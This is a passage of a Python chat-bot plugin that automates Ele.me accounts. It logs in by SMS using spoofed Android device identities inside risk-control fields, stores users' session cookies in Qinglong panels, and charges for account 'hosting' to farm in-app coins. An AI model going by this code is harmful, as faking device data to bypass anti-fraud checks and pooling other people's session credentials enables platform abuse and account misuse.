        shouldBreak = False
        self.rightId = ''
        replyMessage = []
        if self.checkCookie():
            pass
        else:
            return '账号已失效'
        host = 'mtop.ele.me'
        api = 'mtop.koubei.interactioncenter.snatch.mine.page'
        for i in range(20):
            data = {
                "bizScene":"duobao_external",
                "blockList":"[\"participants\",\"wonDetail\",\"noWonPrize\"]",
                "channel":"ELMC",
                "pageSize":"50",
                "rightId":self.rightId
                }
            response = self.h5commonReq(host,api,data)
            res = json.loads(response)
            self.rightId = find_key_value(res,'rightId')
            if res['data']['list']:
                for index,i in enumerate(res['data']['list']):
                    awardStatus = i.get('awardStatus')
                    awardTime= i['baseInfo']['awardTime']
                    title = i['baseInfo']['title']
                    if awardStatus:
                        if awardTime <= getDelta(8):
                            shouldBreak = True
                            break
                        if awardStatus in ['not_won_wait_accept','not_won_has_finished']:
                            status = '未中奖'
                        elif awardStatus in ['won_wait_accept','won_has_finished']:
                            status = '🎉中奖啦'
                            replyMessage.append(f'【{title}】\n状态：{status}，开奖时间：{awardTime}')
                        else:
                            status = awardStatus
            else:
                break
            if shouldBreak:
                break
        if replyMessage:
            return '\n'.join(replyMessage)
        else:
            return '未查询到7天内的中奖记录'

    def generateCookie(self):
        self.appId = randomStr(56)
        self.cookie['utdid'] = self.cookie['utdid'] if self.cookie.get('utdid') else randomStr(24)
        self.cookie['deviceId'] = self.cookie['deviceId'] if self.cookie.get('deviceId') else randomStr(64)
        if 'umt' not in self.cookie:
            self.cookie['umt'] = 'B2YBzG5LPGzbWBKLrS3gOkXNn2hdsnLq'

    def mlogintokenlogin(self,havana_iv_token,type):
        st,t = get_ts(True)
        host = 'acs.m.goofish.com'
        api = 'mtop.alsc.mloginservice.mlogintokenlogin'
        data = {
            "ext":json.dumps({
                "aliusersdk_h5querystring":f"havana_iv_token={havana_iv_token}&action=continueLogin",
                "apiVersion":"2.0",
                "deviceName":"PDRM00",
                "sdkTraceId":f"smsLogin_{self.cookie.get('utdid')}_{st}_PagePhoneLogin"
                }),
            "tokenInfo":json.dumps({
                "appName":"24895413",
                "appVersion":"android_10.14.3",
                "biometricState":"available",
                "deviceId":self.cookie.get('deviceId'),
                "deviceName":"OPPO(PDRM00)",
                "ext":{"aFrom":"{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"eventName\":\"USER_LOGOUT\"}{\"apiName\":\"mtop.alsc.eleme.homepagev1\",\"appBackGround\":false,\"eventName\":\"SESSION_INVALID\",\"fcMainAction\":\"RETRY\",\"fcSubAction\":8,\"processName\":\"me.ele\",\"v\":\"1.0\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"apiName\":\"mtop.relationrecommend.ElemeRecommend.recommend\",\"appBackGround\":false,\"eventName\":\"SESSION_INVALID\",\"fcMainAction\":\"RETRY\",\"fcSubAction\":8,\"processName\":\"me.ele\",\"v\":\"1.0\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}","firstLogin":False,"huaweiLogin":False,"pad":False},
                "scene":"1015",
                "sdkVersion":"android_10.14.3",
                "site":25,
                "supportBiometricType":"fingerprint",
                "t":0,
                "token":self.token,
                "tokenType":"mloginToken",
                "ttid":"1601274955355@eleme_android_10.14.3",
                "useAcitonType":True,
                "useDeviceToken":True,
                "utdid":self.cookie.get('utdid')
                }),
            "riskControlInfo":json.dumps({
                "apdId":self.appId,
                "appStore":"1601274955355@eleme_android_10.14.3",
                "deviceBrand":"OPPO",
                "deviceModel":"PDRM00",
                "deviceName":"PDRM00",
                "osName":"android",
                "osVersion":"13",
                "screenSize":"0x0",
                "t":str(t),
                "umidToken":self.cookie['umt'],
                "wua":""
                })
            }
        response = self.appRequest(host,api,data)
        res = json.loads(response)
        code = find_key_value(res,'code')
        if code == 3000 or code == '3000': # 登陆成功
            try:
                data = json.loads(res['data']['returnValue']['data'])
                message = find_key_value(res,'message')
                self.cookie['token'] = data['autoLoginToken']
                self.cookie['cookie2'] = data['sid']
                for i in json.loads(data['loginServiceExt']['eleExt']):
                    if 'SID' == i['name']:
                        self.cookie['SID'] = i['value']
                        break
                return True
            except Exception as e:
                message = str(e)
        else:
            message = find_key_value(res,'message') if find_key_value(res,'message') else '未知错误'
        return message

    def exchangelist(self):
        try:
            host = 'mtop.ele.me'
            api = 'mtop.koubei.interactioncenter.platform.right.exchangelist'
            data = {
                "actId":"20221207144029906162546384",
                "collectionId":"20221216181231449964003945",
                "bizScene":"game_center",
                "longitude":self.longitude,
                "latitude":self.latitude
                }
            response = self.h5commonReq(host,api,data)
            res = json.loads(response)
            return res['data']['data']['rightInfoList']
        except:
            return
        
    def smssend(self,phone):
        self.generateCookie()
        st,t = get_ts(True)
        host = 'waimai-guide.ele.me'
        api = 'mtop.alsc.mloginservice.smssend'
        data = {
            "ext":json.dumps({
                "apiReferer":"{\"event\":\"clearAutoLoginInfo\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"event\":\"clearAutoLoginInfo\"}{\"eventName\":\"USER_LOGOUT\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}",
                "apiVersion":"2.0",
                "deviceName":"PDRM00",
                "sdkTraceId":f"smsLogin_{self.cookie['utdid']}_{st}_PagePhoneLogin",
                "showReigsterPolicy":"true"
                }),
            "loginInfo":json.dumps({
                "appName":"24895413",
                "appVersion":"android_10.14.3",
                "biometricState":"available",
                "codeLength":"4",
                "countryCode":"CN",
                "deviceId":self.cookie['deviceId'],
                "deviceName":"Android(AOSP on blueline)",
                "ext":{
                    "aFrom":"{\"event\":\"clearAutoLoginInfo\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"event\":\"clearAutoLoginInfo\"}{\"eventName\":\"USER_LOGOUT\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}",
                    "firstLogin":False,
                    "huaweiLogin":False,
                    "pad":False
                    },
                "locale":"zh_CN",
                "loginId":str(phone),
                "loginType":"taobao",
                "phoneCode":"+86",
                "pwdEncrypted":False,
                "sdkVersion":"android_5.3.3.4",
                "site":25,
                "supportBiometricType":"fingerprint",
                "t":t,
                "ttid":"1601274955355@eleme_android_10.14.3",
                "useAcitonType":False,
                "useDeviceToken":False,
                "utdid":self.cookie['utdid']
                }),
            "riskControlInfo":json.dumps({
                "apdId":self.appId,
                "appStore":"1601274955355@eleme_android_10.14.3",
                "deviceBrand":"Google",
                "deviceModel":"AOSP on blueline",
                "deviceName":"AOSP on blueline",
                "osName":"android",
                "osVersion":"10",
                "screenSize":"0x0",
                "t":str(t+1),
                "umidToken":self.cookie['umt'],
                "wua":""
                })
            }
        response = self.appRequest(host,api,data)
        res = json.loads(response)
        self.smsSid = find_key_value(res,'smsSid')
        if self.smsSid:
            return True
        else:
            print(find_key_value(res,'ret')[0])
            return False

    def smslogin(self,phone,code):
        st,t = get_ts(True)
        host = 'waimai-guide.ele.me'
        api = 'mtop.alsc.mloginservice.smslogin'
        data = {
            'ext': json.dumps({
                "apiReferer":"{\"event\":\"clearAutoLoginInfo\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"event\":\"clearAutoLoginInfo\"}{\"eventName\":\"USER_LOGOUT\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}",
                "apiVersion":"2.0",
                "deviceName":"Android(AOSP on blueline)",
                "sdkTraceId":f"smsLogin_{self.cookie['utdid']}_{st}_PagePhoneLogin",
                "showReigsterPolicy":"true"
                }),  
            'loginInfo': json.dumps({
                "appName":"24895413",
                "appVersion":"android_10.14.3",
                "biometricState":"available",
                "countryCode":"CN",
                "deviceId":self.cookie['deviceId'],
                "deviceName":"Android(AOSP on blueline)",
                "ext":{
                    "aFrom":"{\"event\":\"clearAutoLoginInfo\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"event\":\"clearAutoLoginInfo\"}{\"eventName\":\"USER_LOGOUT\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}{\"eventName\":\"autoLoginToken=null|trySdkLogin\"}",
                    "firstLogin":False,
                    "huaweiLogin":False,
                    "pad":False
                    },
                "locale":"zh_CN",
                "loginId":str(phone),
                "loginType":"taobao",
                "phoneCode":"+86",
                "pwdEncrypted":False,
                "sdkVersion":"android_5.3.3.4",
                "site":25,
                "smsCode":str(code),
                "smsSid":self.smsSid,
                "supportBiometricType":"fingerprint",
                "t":t,
                "ttid":"1601274955355@eleme_android_10.14.3",
                "useAcitonType":False,
                "useDeviceToken":False,
                "utdid":self.cookie['utdid']
                }), 
            'riskControlInfo': json.dumps({
                "apdId":self.appId,
                "deviceBrand":"Google",
                "deviceModel":"AOSP on blueline",
                "deviceName":"AOSP on blueline",
                "extRiskData":{},
                "t":str(t),
                "umidToken":self.cookie['umt'],
                "wua":""
                })
            }
        response = self.appRequest(host,api,data)
        res = json.loads(response)
        code = find_key_value(res,'code')
        if code == 13060 or code == '13060': # 短信验证
            message = find_key_value(res,'message')
            self.token = find_key_value(res,'token')
            self.h5Url = find_key_value(res,'h5Url')
            return '需要验证'
        elif code == 3000 or code == '3000': # 登陆成功
            print(response)
            try:
                data = json.loads(res['data']['returnValue']['data'])
                message = find_key_value(res,'message')
                self.cookie['token'] = data['autoLoginToken']
                self.cookie['cookie2'] = data['sid']
                for i in json.loads(data['loginServiceExt']['eleExt']):
                    if 'SID' == i['name']:
                        self.cookie['SID'] = i['value']
                        break
                for i in json.loads(data['loginServiceExt']['eleExt']):
                    if 'USERID' == i['name']:
                        self.cookie['USERID'] = i['value']
                        break
                return True
            except Exception as e:
                message = e
        else:
            message = find_key_value(res,'message') if find_key_value(res,'message') else '未知错误'
        return message

class MAIN():
    def __init__(self,authorizationType):
        senderID = middleware.getSenderID()
        self.sender = middleware.Sender(senderID)
        self.userId = self.sender.getUserID()
        self.UserName = self.sender.getUserName()
        self.message = self.sender.getMessage()
        self.imtype:str = self.sender.getImtype()
        self.gaia = GAIA(self.userId,self.UserName,self.imtype)
        self.authorization = Authorization(self.userId,self.imtype,authorizationType)
        self.elmConfigBucket = f'chuan_{authorizationType}_config'
        self.envname = 'elmck'
        self.effectCk = []
        self.notify = [] # 已通知用户
        self.invalidAccountId = []
        self.qlData = [] # 青龙数据
    
    # 获取用户输入内容
    def session(self,content,quitTip=['Q','q','退出'],timeout=60):
        # 对长消息进行处理
        content = content.split('\n')
        for i in chunk_list(content,60):
            self.sender.reply('\n'.join(i))
        userInput = self.sender.input(timeout*1000,0,False)
        if userInput in quitTip:
            self.sender.reply('退出')
            return False
        if userInput:
            return userInput
        else:
            self.sender.reply('输入超时，自动退出程序')
            return False 

    # 初始化配参
    def initializationParam(self):
        # 价格
        price = middleware.bucketGet(self.elmConfigBucket,'price') # 续费价格
        if price == '0' or price == '':
            self.price = 0
        else:
            self.price = round(float(price),2)
            self.integral = int(self.price*100)

        firstPrice = middleware.bucketGet(self.elmConfigBucket,'firstPrice') # 首月价格
        if firstPrice == '0' or firstPrice == '':
            self.firstPrice = 0
            self.firstIntegral = 0
        else:
            self.firstPrice = round(float(firstPrice),2)
            self.firstIntegral = int(self.firstPrice*100)

        lybOwnprice = middleware.bucketGet(self.elmConfigBucket,'lybOwnprice') # 助力价格
        if lybOwnprice == '0' or lybOwnprice == '':
            self.lybOwnprice = 0
            self.lybOwnIntegral = 0
        else:
            self.lybOwnprice = round(float(lybOwnprice),2)
            self.lybOwnIntegral = int(self.lybOwnprice*100)
        
        qqPrice5 = middleware.bucketGet(self.elmConfigBucket,'qqPrice5') # 5抢券价格
        if qqPrice5 == '0' or qqPrice5 == '':
            self.qqPrice5 = 0
            self.qqIntegral5 = 0
        else:
            self.qqPrice5 = round(float(qqPrice5),2)
            self.qqIntegral5 = int(self.qqPrice5*100)
        
        qqPrice12 = middleware.bucketGet(self.elmConfigBucket,'qqPrice12') # 12抢券价格
        if qqPrice12 == '0' or qqPrice12 == '':
            self.qqPrice12 = 0
            self.qqIntegral12 = 0
        else:
            self.qqPrice12 = round(float(qqPrice12),2)
            self.qqIntegral12 = int(self.qqPrice12*100)
        
        qqPrice20 = middleware.bucketGet(self.elmConfigBucket,'qqPrice20') # 20抢券价格
        if qqPrice20 == '0' or qqPrice20 == '':
            self.qqPrice20 = 0
            self.qqIntegral20 = 0
        else:
            self.qqPrice20 = round(float(qqPrice20),2)
            self.qqIntegral20 = int(self.qqPrice20*100)
        
        # 助力变量
        self.lybOwnEnv = middleware.bucketGet(self.elmConfigBucket,'lybOwnEnv')
        if self.lybOwnEnv == '':
            self.lybOwnEnv = 'lybOwnCookie'

        # 支付方式
        self.payWay = middleware.bucketGet(self.elmConfigBucket,'payWay')
        if self.payWay not in ['gaia','appreciationCode']:
            self.sender.reply('未设置收费方式，请填写配参')
            return False
        # 赞赏码
        self.rewardCode = middleware.bucketGet(self.elmConfigBucket,'rewardCode')
        return True

    # 获取需要的青龙容器
    def get_ql(self):
        if self.qlData == []:
            # 获取青龙
            try:
                qls = self.sender.bucketAllKeys('qls')
            except:
                middleware.notifyMasters(f'插件【我不饿】提醒您，请去【系统管理】-【插件权限】开启qls权限')
                return
            # 获取青龙变量
            needql = middleware.bucketGet('chuan_elm_config','elmql').split(',')
            for i in qls:
                ql = json.loads(self.sender.bucketGet('qls', i))
                name = ql.get('name')
                if name in needql:
                    host = ql.get('host')
                    client_id = ql.get('client_id')
                    client_secret = ql.get('client_secret')
                    try:
                        ql = qinglong(host,client_id,client_secret)
                        ql.get_ql_token()
                        allenv = ql.get_ql_env()
                        self.qlData.append({
                            'ql': ql,
                            'data': allenv
                        })
                    except Exception as e:
                        if self.sender.isAdmin():
                            middleware.notifyMasters(f'插件【我不饿】提醒您：青龙{name}连接失败，报错：{e}')
                        else:
                            self.sender.reply(f'插件【我不饿】提醒您：青龙{name}连接失败，请联系管理员')

    def getRemarks(self,key):
        # 获取备注
        userId = imtype = ''
        for i in imtypeList:
            if key in middleware.bucketAllKeys(f'chuan_elm{i.upper()}'):
                imtype += f'{i}|'
                userId += f"{middleware.bucketGet(f'chuan_elm{i.upper()}',key)}|"
        remark = middleware.bucketGet(self.authorization.accountId_remark, key) if middleware.bucketGet(self.authorization.accountId_remark, key) else '无'
        return f'管理账号：{userId} 平台：{imtype.upper()} 备注：{remark}' if userId and imtype else f'管理账号：{self.userId} 平台：{self.imtype.upper()} 备注：{remark}'

    # 提交青龙模块
    def submit_ql(self,key,envValue,isEffect=True): # status:账号是否有效
        self.get_ql()
        qlData = self.qlData
        # 处理elmck
        value_ = str2dict(envValue)
        oValue = dict2str(value_,False)
        # 获取容器上限
        try:
            cklimit = int(middleware.bucketGet('chuan_elm_config','elmcklimit')) if self.envname == 'elmck' else int(middleware.bucketGet('chuan_elm_config','lybOwncklimit'))
        except:
            cklimit = 9999
        # 更新，启用，禁用
        isExist = False # 青龙是否存在该变量
        # self.sender.reply(self.envname)
        if isEffect == True:
            for i in qlData:
                ql = i['ql']
                data = i['data']
                for env in data:
                    id = env.get('id')
                    name = env.get('name')
                    cookie = env.get('value')
                    remarks = env.get('remarks')
                    status = env.get('status') # 0为启用，1为禁用
                    if name == self.envname and key in cookie: # 存在
                        isExist = True
                        # 判断是否更新ck
                        oRemarks = self.getRemarks(key)
                        if oValue == cookie and remarks == oRemarks:
                            if status == 0:   
                                prinf(f'{key}：{self.envname}状态一致')
                            else:
                                ql.enable_env(id)
                                prinf(f'{key}：{self.envname}状态一致，启用成功')
                        else:
                            ql.update_env(name,oValue,oRemarks,id)
                            if status == 0:   
                                prinf(f'{key}：{self.envname}更新成功')
                            else:
                                ql.enable_env(id)
                                prinf(f'{key}：{self.envname}更新并启用成功')
        else:
            # 尝试禁用ck
            for i in qlData:
                ql = i['ql']
                data = i['data']
                for env in data:
                    id = env.get('id')
                    name = env.get('name')
                    cookie = env.get('value')
                    status = env.get('status')
                    if name == self.envname and key in cookie: # 存在
                        isExist = True 
                        if status == 0:   
                            ql.disable_env(id)
                            prinf(f'{key}：禁用{self.envname}成功')
                        else:
                            prinf(f'{key}：{self.envname}已被禁用')
        # 添加新账号
        if isExist == False:
            # 判断是否添加
            for index,i in enumerate(qlData):
                ql = i['ql']
                data = i['data']
                # 判断变量数量
                envnum = 0
                for env in data:
                    name = env.get('name')
                    if name == self.envname:
                        envnum += 1
                if envnum >= cklimit:
                    prinf(f'{key}：容器{index}{self.envname}已满，尝试下一个')
                else: # 未满，提交ck
                    oRemarks = self.getRemarks(key)
                    ql.submit_env([{"value":oValue,"name":self.envname,"remarks":oRemarks}])
                    self.qlData[index]['data'].append({"name":self.envname,"value":oValue,"remarks":oRemarks,"status": 0})
                    prinf(f'{key}：提交{self.envname}成功')
                    break
    # 盖亚支付
    def gaiaPayModule(self,needintegral):
        self.gaia.get_info()
        if self.gaia.user_json['balance'] + self.gaia.user_json['integral'] >= needintegral:
            self.gaia.del_balance(needintegral,f'乐园币代挂',True)
            return True
        else:
            self.sender.reply(f"余额不足{needintegral}，请发送充值")
            return False
    
    # 赞赏码支付
    def appreciationCodePayModule(self,needprice):
        self.sender.reply(f"请在2分钟内使用【微信APP】完成打赏{needprice}元(发送【q】取消操作)")
        self.sender.replyImage(self.rewardCode)  # 发送支付二维码的函数调用
        try:
            payment_response = self.sender.waitPay('q', 120*1000)
        except:
            self.sender.reply('打赏超时，自动退出程序')
            return False
        if payment_response == 'q' or payment_response == 'Q':
            self.sender.reply('退出')
            return False
        if isinstance(payment_response, str):
            payment_response = json.loads(payment_response)
        actual_amount = payment_response.get("money") if payment_response.get("money")  else payment_response.get("Money") # 确保为浮点数
        from_name = payment_response.get("from_name") if payment_response.get("from_name") else payment_response.get("FromName")  # 直接获取字符串
        middleware.notifyMasters(f'收到来自{from_name}的赞赏{actual_amount}元')
        if round(float(actual_amount), 2) == needprice:
            return True
        else:
            self.sender.reply('打赏金额错误，请联系管理员')
            return False

    # 授权模块
    def authorizeAccount(self,key,timeType,isAdmin=False):
        isauthorize = False
        if isinstance(key,str):
            keys = [key]
        else:
            keys = key
        if timeType == 'month':
            amount = self.session('请输入需要的月数（回复整数），回复‘q’退出')
        elif timeType == 'day':
            amount = self.session('请输入需要的天数（回复整数），回复‘q’退出')
        if amount is False:
            return
        if is_positive_integer(amount):
            needPrice = 0
            needintegral = 0
            amount = int(amount)
            # 开始计算所需积分和价格
            for key in keys:
                if '未授权' in self.authorization.queryAuthorizationTime(key):
                    needPrice = self.firstPrice + (amount-1)*self.price + needPrice
                else:
                    needPrice += amount*self.price
            
            needintegral = int(needPrice*100)
            needPrice = round(needPrice,2)
            if isAdmin:
                needPrice = 0
                needintegral = 0

            if needPrice == 0 and needintegral == 0:
                for key in keys:
                    self.sender.reply(f'✅呆瓜成功，{self.authorization.addAuthorizationTime(key,amount,timeType)}')
                    isauthorize = True
            else:
                # 判断支付方式
                if self.payWay == 'gaia':
                    if self.gaiaPayModule(needintegral):
                        self.sender.reply(f'✅支付{needintegral}积分成功')
                        for key in keys:
                            self.sender.reply(self.sender.reply(f'✅呆瓜成功，{self.authorization.addAuthorizationTime(key,amount,timeType)}'))
                            isauthorize = True
                elif self.payWay == 'appreciationCode':
                    if self.sender.atWaitPay(): 
                        self.sender.reply("赞赏系统正在运行，请稍等再试")
                        return
                    if self.appreciationCodePayModule(needPrice):
                        self.sender.reply(f'✅支付{needPrice}R成功')
                        for key in keys:
                            self.sender.reply(self.sender.reply(f'✅呆瓜成功，{self.authorization.addAuthorizationTime(key,amount,timeType)}'))
                            isauthorize = True    
                else:
                    self.sender.reply('未接入支付系统')
        else:
            self.sender.reply('输入错误，自动退出程序') 
        
        if isauthorize:
            for i in keys:
                cookie = middleware.bucketGet(self.authorization.accountId_Bucket,i)
                if cookie:
                    self.submit_ql(i,cookie)
        return isauthorize

    # 登记模块
    def recordAccount(self):
        # 查询该账号所有绑定信息
        elmuser = ELM(1,self.message)
        if elmuser.checkCookie() is False:
            self.sender.reply('无效COOKIE，自动退出程序')
            return
        # 获取cookie详细信息
        if elmuser.userInfo():
            # 绑定账号关系
            self.authorization.associationAccountId(elmuser.cookie.get('USERID'),self.message,elmuser.mobile)
            replyMessage = f"🗣️【用户名】：{elmuser.userName}\n☎️【手机号】：{elmuser.mobile}\n"
            isUpdate = False
            # 查询云授权
            AuthorizationTime = self.authorization.queryAuthorizationTime(elmuser.cookie.get('USERID'))
            replyMessage += f"☁️【云授权到期】：{AuthorizationTime}\n"
            if AuthorizationTime not in ['未授权','已过期']:
                self.submit_ql(elmuser.cookie.get('USERID'),dict2str(elmuser.cookie,False))
                isUpdate = True
            if middleware.bucketGet(self.elmConfigBucket,'lybOwnCheckbox') == 'true':
                # 查询助力授权
                self.authorization.accountAuthorizationTime_Bucket = 'chuan_elmZL_AuthorizationTime'
                self.envname = self.lybOwnEnv
                AuthorizationTime = self.authorization.queryAuthorizationTime(elmuser.cookie.get('USERID'))
                replyMessage += f"☁️【助力授权到期】：{AuthorizationTime}\n"
                if AuthorizationTime not in ['未授权','已过期']:
                    self.submit_ql(elmuser.cookie.get('USERID'),dict2str(elmuser.cookie,False))
                    isUpdate = True
            if isUpdate:
                replyMessage += f'😊【状态】：更新成功\n'
            else:
                replyMessage += f'😊【状态】：{self.recordText}\n'
            self.sender.reply(replyMessage)

            # 判断是否开始授权ck
            if middleware.bucketGet(self.elmConfigBucket,'authorizeCK') == 'true':
                self.authorization.accountAuthorizationTime_Bucket = 'chuan_elm_AuthorizationTime'
                self.envname = 'elmck'
                if isUpdate is False:
                    select = self.session(f'💰乐园币价格\n首月：{self.firstPrice}r/月/号\n续费：{self.price}r/月/号\n🧬该账号未授权，是否授权（y/n）')
                    if select in ['y','Y','是']:
                        self.authorizeAccount(elmuser.cookie.get('USERID'),'month')
                    elif select in ['n','N','否']: 
                        self.sender.reply('退出成功')
                        return
        else:
            self.sender.reply('获取用户信息失败')

    # 续费模块
    def renewalAccount(self):
        # 查询绑定账号
        allAccount = self.authorization.queryAllAccount(True,True)
        if len(allAccount) == 0:
            self.sender.reply(self.unauthorizationText)
        else:
            if middleware.bucketGet(self.elmConfigBucket,'lybOwnCheckbox') == 'true':
                replyMessage = f'---------💰乐园币价格---------\n首月：{self.firstPrice}r/月/号\n续费：{self.price}r/月/号\n助力：{self.lybOwnprice}r/月/号\n\n---------账号---------\n【0】全部\n'
            else:
                replyMessage = f'---------💰乐园币价格---------\n首月：{self.firstPrice}r/月/号\n续费：{self.price}r/月/号\n\n---------账号---------\n【0】全部\n'
            for index,i in enumerate(allAccount):
                replyMessage += f'【{index+1}】{i}\n'
                replyMessage += f'☎️手机号：{middleware.bucketGet(self.authorization.accountId_phone,i)}\n'
                replyMessage += f'☁️云授权到期：{self.authorization.queryAuthorizationTime(i)}\n'
                if middleware.bucketGet(self.elmConfigBucket,'lybOwnCheckbox') == 'true':
                    replyMessage += f'☁️助力授权到期：{Authorization(self.userId,self.imtype,"elmZL").queryAuthorizationTime(i)}\n'
            self.sender.reply(replyMessage)
            selectIndex = self.session('请选择需要操作的账号，回复【】内的阿拉伯数字即可，多选用逗号隔开(q退出)')
            if selectIndex is False:
                return
            selectIndex = re.split(r'[,，]', selectIndex)
            # 选择授权类型
            if middleware.bucketGet(self.elmConfigBucket,'lybOwnCheckbox') == 'true':
                selectType = self.session('请选择需要授权的类型，回复【】内的阿拉伯数字即可(q退出)\n【1】：乐园币授权\n【2】：助力授权')
                if selectType is False:
                    return
                if selectType == '1':
                    self.envname = 'elmck'
                    self.authorization.accountAuthorizationTime_Bucket = 'chuan_elm_AuthorizationTime'
                elif selectType == '2':
                    self.envname = self.lybOwnEnv
                    self.authorization.accountAuthorizationTime_Bucket = 'chuan_elmZL_AuthorizationTime'
                    self.price = self.firstPrice = self.lybOwnprice

                if '0' in selectIndex:
                    self.authorizeAccount(allAccount,'month')
                else:
                    keys = []
                    for i in selectIndex:
                        if is_positive_integer(i) and 0 < int(i) <= len(allAccount):
                            key = allAccount[int(i)-1]
                            keys.append(key)
                    self.authorizeAccount(keys,'month')
            else:
                if '0' in selectIndex:
                    self.authorizeAccount(allAccount,'month')
                else:
                    keys = []
                    for i in selectIndex:
                        if is_positive_integer(i) and 0 < int(i) <= len(allAccount):
                            key = allAccount[int(i)-1]
                            keys.append(key)
                    self.authorizeAccount(keys,'month')
    
    def queryOne(self,cookie:str) -> str:
        elmuser = ELM(1,cookie)
        if elmuser.checkCookie():
            elmuser.userInfo()
            self.authorization.associationAccountId(elmuser.cookie.get('USERID'),cookie,elmuser.mobile)
            replyMessage = f'''
🆔【用户ID】：{elmuser.cookie.get('USERID')}
🗣️【用户名】：{elmuser.userName}
☎️【手机号】：{elmuser.mobile}
'''     
            if  middleware.bucketGet(self.elmConfigBucket,'allcoinCheckbox') == 'true':
                elmuser.queryAllCoin()
                replyMessage += f'🍥【总计乐园币】：{elmuser.allcoin}\n'

            if  middleware.bucketGet(self.elmConfigBucket,'coinInfoCheckbox') == 'true':
                elmuser.queryCoinInfo()
                replyMessage += f'🍥【今日乐园币】：{elmuser.todaycoin}\n'
                replyMessage += f'🍥【今日消耗币】：{elmuser.deltodaycoin}\n'

            if  middleware.bucketGet(self.elmConfigBucket,'cashCheckbox') == 'true':
                elmuser.queryBalanceBycardType()
                replyMessage += f'💰【笔笔返余额】：{elmuser.cash}\n'

            if  middleware.bucketGet(self.elmConfigBucket,'fruitCheckbox') == 'true':
                elmuser.queryFruit()
                replyMessage += f'🍎【水果兑换券】：{elmuser.fruitNum}\n'
                replyMessage += f'🌳【果园详情】：{elmuser.schedule}\n'
                
            middleware.bucketSet(self.authorization.accountId_phone,elmuser.cookie.get('USERID'),elmuser.mobile)
        else:
            replyMessage = f'''
🆔【用户ID】：{elmuser.cookie.get('USERID')}
☎️【手机号】：{middleware.bucketGet(self.authorization.accountId_phone,elmuser.cookie.get('USERID'))}
😭【状态】：账号已失效，请发送cookie更新
''' 
        replyMessage += f"☁️【云授权到期】：{self.authorization.queryAuthorizationTime(elmuser.cookie.get('USERID'))}\n"
        if middleware.bucketGet(self.elmConfigBucket,'lybOwnCheckbox') == 'true':
            replyMessage += f"☁️【助力授权到期】：{Authorization(self.userId,self.imtype,'elmZL').queryAuthorizationTime(elmuser.cookie.get('USERID'))}"
        return replyMessage

    def queryOneInfo(self,cookie:str):
        elmuser = ELM(1,cookie)
        if elmuser.checkCookie():
            elmuser.userInfo()
            coinInfo = elmuser.queryCoinInfo()
            elmuser.queryFruit()
            replyMessage = f'''
🆔【用户ID】：{elmuser.cookie.get('USERID')}
🗣️【用户名】：{elmuser.userName}
☎️【手机号】：{elmuser.mobile}
🍥【今日乐园币】：{elmuser.todaycoin}
🍥【今日消耗币】：{elmuser.deltodaycoin}
--------果园详情--------
{elmuser.scheduleInfo}
--------乐园币详情--------
{coinInfo}
'''     
            middleware.bucketSet(self.authorization.accountId_phone,elmuser.cookie.get('USERID'),elmuser.mobile)
        else:
            replyMessage = f'''
🆔【用户ID】：{elmuser.cookie.get('USERID')}
☎️【手机号】：{middleware.bucketGet(self.authorization.accountId_phone,elmuser.cookie.get('USERID'))}
😭【状态】：账号已失效，请发送cookie更新
'''
        return replyMessage
    # 查询
    def queryAccount(self,info=False):
        # 查询绑定账号
        if middleware.bucketGet(self.elmConfigBucket,'authorizeCheckbox') == 'true':
            allAccount = self.authorization.queryAllAccount()
        else:
            allAccount = self.authorization.queryAllAccount(True,True)
        if len(allAccount) == 0:
            self.sender.reply(self.unauthorizationText)
        elif len(allAccount) == 1:
            value = middleware.bucketGet(self.authorization.accountId_Bucket,allAccount[0])
            # 开始查询详细信息
            self.sender.reply('获取数据中，请稍等~')
            if info:
                self.sender.reply(self.queryOneInfo(value))
            else:
                self.sender.reply(self.queryOne(value))
        else:
            replyMessage = '请选择要查询的账号，多选用逗号隔开：\n【0】全部\n'
            for index,i in enumerate(allAccount):
                replyMessage += f'【{index+1}】{i}\n'
            select = self.session(replyMessage)
            if select is False:
                return
            select = re.split(r'[,，]', select)
            self.sender.reply('获取数据中，请稍等~')
            if '0' in select:
                for i in allAccount:
                    value = middleware.bucketGet(self.authorization.accountId_Bucket,i)
                    if info:
                        self.sender.reply(self.queryOneInfo(value))
                    else:
                        self.sender.reply(self.queryOne(value))
            else:
                for i in select:
                    if is_positive_integer(i) and 0 < int(i) <= len(allAccount):
                        key = allAccount[int(i)-1]
                        value = middleware.bucketGet(self.authorization.accountId_Bucket,key)
                        # 开始查询详细信息
                        if info:
                            self.sender.reply(self.queryOneInfo(value))
                        else:
                            self.sender.reply(self.queryOne(value))
    # 简易查询模块
    def queryAccountEasy(self):
        # 查询绑定账号
        if middleware.bucketGet(self.elmConfigBucket,'authorizeCheckbox') == 'true':
            allAccount = self.authorization.queryAllAccount()
        else:
            allAccount = self.authorization.queryAllAccount(True,True)
        if len(allAccount) == 0:
            self.sender.reply(self.unauthorizationText)
        else:
            replyMessage = f'请选择要查询的数据：(q退出)\n【1】：今日乐园币\n【2】：总计乐园币\n【3】：今日吃货豆\n【4】：总计吃货豆\n【5】：云授权时间\n请回复【】中的数字'
            select = self.session(replyMessage)
            if select is False:
                return
            # 获取所有账号
            if select == '1':
                self.sender.reply('获取数据中，请稍等~') 
                replyMessage = '今日乐园币:\n'
                for index,accountId in enumerate(allAccount):
                    cookie = middleware.bucketGet(self.authorization.accountId_Bucket,accountId)
                    elmuser = ELM(1,cookie)
                    # 获取备注
